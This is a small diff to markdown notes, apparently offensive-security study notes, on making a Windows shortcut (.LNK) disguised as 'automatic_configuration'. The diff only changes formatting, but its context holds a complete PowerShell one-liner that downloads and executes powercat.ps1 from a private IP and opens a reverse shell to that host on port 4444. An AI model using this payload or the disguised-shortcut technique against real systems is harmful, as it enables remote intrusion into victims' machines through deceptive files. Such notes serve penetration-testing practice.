@@ -125,7 +125,7 @@ GUID is valid Documents guid..
 ### Create Shortcut .LNK
 - Right-click, new Shortcut
 - Enter powershell command
-- ```powershell
+```powershell
 powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.158:8000/powercat.ps1');powercat -c 192.168.45.158 -p 4444 -e powershell"
 ```
 - Name shortcut  **automatic_configuration**
